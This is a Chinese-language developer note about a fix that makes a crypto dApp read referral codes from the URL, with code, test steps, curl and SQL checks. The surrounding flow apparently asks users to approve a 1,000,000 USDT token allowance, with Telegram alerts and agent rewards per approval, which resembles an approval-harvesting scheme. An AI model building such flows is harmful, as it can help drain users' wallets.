# 代理邀请链接URL参数读取修复

## 问题发现

前端主页**没有读取URL中的ref参数**，导致用户访问代理邀请链接时，邀请码无法被识别。

## 代码检查

### 发现的问题
1. `referralCode` 状态已定义但从未被设置
2. 没有读取 URL 参数 `?ref=AGENT000009` 的逻辑
3. 授权时虽然传递了 `referralCode`，但值总是 `undefined`

### 授权代码（已存在）
**位置：** `src/app/page.tsx` 第538-550行

```typescript
const response = await fetch('/api/user/authorize', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    address: account,
    wallet_address: account,
    isAuthorized: true,
    txHash: String(txHash),
    amount: defaultAmount,
    referralCode: referralCode || undefined  // 这里会传递，但referralCode总是null
  })
})
```

## 修复内容

### 1. 添加URL参数读取逻辑

**文件：** `src/app/page.tsx`
**位置：** 第252行之前（在Telegram服务启动之前）

**添加代码：**
```typescript
// 读取URL中的邀请码参数
useEffect(() => {
  if (typeof window !== 'undefined') {
    const params = new URLSearchParams(window.location.search)
    const ref = params.get('ref')
    
    if (ref) {
      console.log('🔗 检测到邀请码:', ref)
      setReferralCode(ref)
      // 保存到localStorage，确保授权时可用
      localStorage.setItem('referralCode', ref)
      console.log('✅ 邀请码已保存到localStorage')
    } else {
      // 尝试从localStorage读取之前保存的邀请码
      const savedRef = localStorage.getItem('referralCode')
      if (savedRef) {
        console.log('📦 从localStorage读取邀请码:', savedRef)
        setReferralCode(savedRef)
      }
    }
  }
}, [])
```

### 2. 增强授权时的referralCode传递

**修改授权调用：**
```typescript
referralCode: referralCode || localStorage.getItem('referralCode') || undefined
```

**优先级：**
1. state中的referralCode
2. localStorage中的referralCode
3. undefined（无邀请码）

## 修复后的完整流程

### 步骤1：用户访问邀请链接
```
URL: http://localhost:3000?ref=AGENT000009

前端处理:
  → useEffect检测到URL参数ref
  → 设置referralCode state = "AGENT000009"
  → 保存到localStorage
  → 控制台输出: "🔗 检测到邀请码: AGENT000009"
```

### 步骤2：用户连接钱包
```
点击Connect Wallet
→ AppKit连接钱包
→ 获取用户地址: 0xUserAddress
```

### 步骤3：用户授权
```
点击授权按钮
→ approveUsdt("1000000")
→ 等待区块链交易
→ 获取txHash

调用授权API:
  POST /api/user/authorize
  Body: {
    wallet_address: "0xUserAddress",
    isAuthorized: true,
    referralCode: "AGENT000009",  ← 正确传递
    txHash: "0x...",
    amount: "1000000"
  }
```

### 步骤4：后端处理
```
/api/user/authorize:
  1. 查询用户是否存在
  2. 如果用户不存在，创建用户
  3. 根据referralCode查找代理
  4. 找到agent_id=9 (XL002)
  5. 设置用户的agent_id=9
  6. 更新approved=1
  7. 更新代理统计: total_invites+1, valid_invites+1
  8. 发送Telegram通知（包含代理信息）
  9. 发放授权奖励
```

### 步骤5：验证结果
```
数据库查询:
SELECT 
  wallet_address,
  agent_id,
  approved,
  telegram_user_id
FROM nh_member_new
WHERE wallet_address = '0xUserAddress';

预期结果:
  agent_id: 9  ✓
  approved: 1  ✓
  
代理统计:
  XL002.total_invites: 0 → 1  ✓
  XL002.valid_invites: 0 → 1  ✓

代理后台:
  能看到新用户  ✓
```

## 测试方法

### 方法1：完整浏览器测试
```
1. 打开浏览器
2. 访问: http://localhost:3000?ref=AGENT000009
3. 打开开发者控制台
4. 检查日志: 应该看到 "🔗 检测到邀请码: AGENT000009"
5. 连接MetaMask钱包
6. 点击授权按钮
7. 确认交易
8. 等待完成
9. 检查控制台日志，确认referralCode已传递
```

### 方法2：使用localStorage测试
```javascript
// 在浏览器控制台手动设置
localStorage.setItem('referralCode', 'AGENT000009')

// 然后连接钱包并授权
// 授权时会从localStorage读取
```

### 方法3：API直接测试
```bash
# 直接调用授权API
curl -X POST http://localhost:3000/api/user/authorize \
  -H "Content-Type: application/json" \
  -d '{
    "wallet_address": "0xTestUser20251008",
    "isAuthorized": true,
    "referralCode": "AGENT000009",
    "amount": "1000000"
  }'
```

## 验证清单

测试时检查以下输出：

### 前端控制台
```
- [x] 🔗 检测到邀请码: AGENT000009
- [x] ✅ 邀请码已保存到localStorage
- [x] 💰 授权金额: 1000000 USDT
- [x] ✅ 授权成功: 0x...
- [x] 🔄 立即更新数据库中的用户授权状态...
- [x] ✅ 数据库授权状态更新成功
```

### 后端API日志
```
- [x] 🔑 处理授权请求: { referralCode: 'AGENT000009', ... }
- [x] 🔍 在代理表中查找推荐码: AGENT000009
- [x] ✅ 找到代理推荐人: { id: 9, name: 'XL002', code: 'XL002' }
- [x] 📝 创建新用户记录... (如果是新用户)
- [x] 📝 更新代理邀请统计...
- [x] ✅ 代理邀请统计更新成功
```

### 数据库验证
```sql
-- 查询新用户
SELECT 
  id,
  wallet_address,
  agent_id,
  approved,
  referral_code,
  created_at
FROM nh_member_new
WHERE wallet_address = '测试钱包地址'
ORDER BY created_at DESC
LIMIT 1;

-- 应该看到 agent_id = 9

-- 查询代理统计
SELECT 
  id,
  agent_name,
  total_invites,
  valid_invites
FROM nh_agents
WHERE id = 9;

-- 应该看到 total_invites 和 valid_invites 都增加了1
```

## 修复文件

| 文件 | 修改内容 | 状态 |
|------|---------|------|
| src/app/page.tsx | 添加URL参数读取useEffect | 完成 |
| src/app/page.tsx | 增强授权时referralCode传递逻辑 | 完成 |

## 注意事项

### 1. localStorage持久化
邀请码会保存到localStorage，即使用户刷新页面也能保留。

### 2. 双重保障
```typescript
referralCode || localStorage.getItem('referralCode') || undefined
```
确保即使state丢失，也能从localStorage读取。

### 3. 清理邀请码
如果需要，可以在授权成功后清理：
```typescript
localStorage.removeItem('referralCode')
setReferralCode(null)
```

## 修复完成

- [x] 添加URL参数读取逻辑
- [x] 保存邀请码到localStorage
- [x] 增强授权时的传递逻辑
- [ ] 测试完整流程
- [ ] 验证代理统计更新

现在可以测试了！访问 http://localhost:3000?ref=AGENT000009 应该能正确识别邀请码。




